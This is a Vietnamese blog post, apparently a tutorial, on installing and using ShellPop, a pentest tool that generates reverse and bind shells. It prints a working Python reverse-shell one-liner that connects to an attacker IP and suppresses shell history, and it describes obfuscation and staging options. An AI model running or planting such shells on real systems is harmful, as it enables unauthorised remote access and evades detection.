Bạn đã chán cảnh lưu lại các lệnh shell trên máy tính của mình, và bạn đã mệt mỏi khi đi tìm chúng ở đâu mỗi khi mình cần. Để giải quyết việc này, Shellpop được sinh ra với vô vàn các tiện ích mà nó đem lại, giờ đây bạn sẽ không cần phải lưu lại và đi tìm các lệnh shell mỗi khi cần nữa.

## About
 Công cụ này được phát triển bởi Andre Marques và đây là một mã nguồn mở nên ai có bất kỳ ý tưởng nào hay ho thì tham gia vào cùng phát triển nhé
 
 Github: https://github.com/0x00-0x00/ShellPop
 
 ## Cài đặt
 Chương trình bắt buộc cài Python 2.7
 
 Đầu tiên chúng ta cần phải clone git về 
 
 ```
 git clone https://github.com/0x00-0x00/ShellPop.git
 ```
 Tiếp theo gõ lệnh `cd Shellpop/`
 
 Thực hiện cài đặt các dịch vụ bắt buộc
 ```
 root@kali# apt-get install python-argcomplete metasploit-framework -y
 root@kali# pip install -r requirements.txt
 ```
 Bắt đầu cài đặt
 ```
 root@kali# python setup.py install
 ```
 Vậy là ta đã cài đặt xong, bắt đầu vào sử dụng thôi.
 ## Sử dụng
 ```bash
 root@kali:~/Documents/ShellPop# shellpop --help
usage: shellpop [-h] [-l] [-H HOST] [-P PORT] [--number NUMBER]
                [--shell SHELL] [--reverse] [--bind] [--payload PAYLOAD]
                [--xor] [--base64] [--urlencode] [--ipfuscate]
                [--obfuscate-small] [--handler] [--stager STAGER]
                [--http-port HTTP_PORT] [--powershell-x86] [--powershell-x64]
                [--powershell-random-case] [--clip]

Options:
  -h, --help            show this help message and exit
  -l, --list            List of available shells
  -H HOST, --host HOST  IP to be used in connectback (reverse) shells.
  -P PORT, --port PORT  Port to be used in reverse/bind shell code.
  --number NUMBER       Shell code index number
  --shell SHELL         Terminal shell to be used when decoding some encoding
                        scheme.
  --handler             Use handler, if possible.

Shell Types:
  --reverse             Victim communicates back to the attacking machine.
  --bind                Open up a listener on the victim machine.
  --payload PAYLOAD     Choose the payload

Encoders Options:
  --xor                 Enable XOR obfuscation
  --base64              Encode command in base64.
  --urlencode           Encode the command in URL encoding.

Obfuscation Options:
  --ipfuscate           Obfuscate IP address.
  --obfuscate-small     Obfuscated command will be as small as possible.

Staging Options:
  --stager STAGER       Use staging for shells
  --http-port HTTP_PORT
                        HTTP staging port to be used

PowerShell options:
  --powershell-x86      Use powershell 32-bit executable.
  --powershell-x64      Use powershell 64-bit executable.
  --powershell-random-case
                        Use random-case in powershell payloads.

Miscellaneous:
  --clip                Copy payload to your clipboard automatically.

Pop shells like a master. For more help
visit:https://github.com/0x00-0x00/ShellPop
```
### Danh sách shell
Shellpop cung cấp cho ta khá nhiều tiện ích, bạn có thể liệt kê tất cả các shell của shellpop bằng cách sử dụng tùy chọn lệnh --list
Ví dụ: 
```bash
root@kali:~/Documents/ShellPop# shellpop --list
shellpop v0.36
Contributors: @zc00l,@touhidshaikh,@lowfuel

[+] Bind shells:

  1. Python TCP +pty
  2. Python UDP
  3. Perl TCP
  4. Perl UDP
  5. PHP TCP
  6. PHP UDP
  7. Ruby TCP
  8. Ruby UDP
  9. Netcat (OpenBSD) TCP
 10. Netcat+coproc (OpenBSD) UDP
 11. Netcat (Traditional) TCP
 12. AWK TCP
 13. socat UDP
 14. Windows Powershell TCP
 15. Windows Powershell Nishang TCP


[+] Reverse shells:

  1. Python TCP +pty
  2. Python UDP
  3. PHP TCP
  4. Ruby TCP
  5. Perl TCP 01
  6. Perl TCP 02
  7. Perl UDP [nc -lkvup PORT]
  8. Bash TCP
  9. Windows Powershell TCP
 10. TCLsh TCP
 11. Ncat TCP
 12. Ncat SSL TCP
 13. Netcat (Traditional) UDP
 14. Netcat (Traditional) TCP
 15. Netcat (OpenBSD) mkfifo TCP
 16. Netcat (OpenBSD) mknod TCP
 17. Telnet mkfifo TCP
 18. Telnet mknod TCP
 19. openssl TCP
 20. socat TCP
 21. awk TCP
 22. awk UDP
 23. Windows Bat2Ncat TCP
 24. Windows Powershell Shellcode-Injection a.k.a BloodSeeker TCP - x64
 25. Windows Powershell Tiny TCP
 26. Windows Powershell Nishang TCP
 27. Windows Powershell Nishang ICMP
 28. Windows Bat2Meterpreter TCP
 29. Groovy TCP
```
Ở đây chúng ta thấy được là `shellpop` hỗ trợ đủ loại ngôn ngữ từ Python, PHP, Ruby, Perl cho đến Windows Powershell, ...
`Shellpop` còn hỗ trợ cả TCP, UDP, ICMP, ...
### Sao chép vào clipboard
Shellpop sẽ không cho bạn lãng phí một giây phút nào cả (vì mục đích của chương trình này được tạo ra là giúp người dùng không lãng phí thời gian mà). Với tùy chọn `--clip`, ngay lập tức shell mà bạn vừa tạo ra sẽ được sao chép vào clipboard của bạn rồi. Việc của bạn chỉ việc paste ra mà thôi.
### Bind shells và Reverse shells
Chúng ta tập trung vào 2 vấn đề chính là `Bind shells` và `Reverse shells`

Chúng ta thử tạo 1 `reverse shells` xem sao nhé

Ở đây mình tạo 1 Reverse Shell ở IP trên `eth0` và cổng 4444
![](https://images.viblo.asia/992374e6-9187-4b7d-b16b-7d36653def84.gif)

Command line examples

```bash
root@kali:~# shellpop --host eth0 --port 4444 --reverse --number 1
[+] Execute this code in remote target: 

python -c "import os;import pty;import socket;jbNZvh='192.168.19.100';GCVfMeJlExfIfs=4444;ugQNFu=socket.socket(socket.AF_INET,socket.SOCK_STREAM);ugQNFu.connect((jbNZvh,GCVfMeJlExfIfs));os.dup2(ugQNFu.fileno(),0);os.dup2(ugQNFu.fileno(),1);os.dup2(ugQNFu.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');ugQNFu.close();" 

[+] This shell DOES NOT have a handler set.
```
- `shellpop`: gọi chương trình shellpop
- `--host`: Xác định địa chỉ đích
- `--port`: Xác định cổng
- `--reverse`: Chọn tùy chọn reverse
- `--number`: Xác định kiểu mà mình muốn tạo shell, với số thứ tự ở tùy chọn `--list` bên trên.
### Tự động hoàn thành
Với chức năng này, bạn có thể quên luôn cái `--list`,  `--number` kia đi, dưới đây là ví dụ cho các bạn hiểu.
![](https://images.viblo.asia/7b411018-ca6c-4d8a-b780-6d9b8064a249.gif)

Chỉ cần bám vào đối số của `--payload` là bạn có thể tự tạo cho mình 1 shell mong muốn rồi.

### Mã hóa 
Hiện tại chương trình cung cấp 3 loại mã hóa là XOR, Base64 và URL. Chúng ta có thể sử dụng từng loại mã hóa hoặc có thể "mix" nhiều loại với nhau.

Ví dụ:
![](https://images.viblo.asia/06c7963b-8207-4e3a-8cef-9d2a92a55e15.gif)
### Handlers
Tùy chọn này giúp bạn giảm thiểu tối đa việc tạo và connect shell. Ví dụ:
![](https://images.viblo.asia/9bfbcc67-820a-4d40-b0c7-37121013deca.gif)

## Tổng kết
Shellpop là một công cụ tuyệt vời cho những bài pentest. Còn rất nhiều tiện ích hay mà công cụ đem lại, bạn đọc tìm hiểu dần dần nhé. 
Nếu thấy bài viết hữu ích thì để lại 1 share 1 upvote để mình có động lực ra các bài viết hay hơn nhé.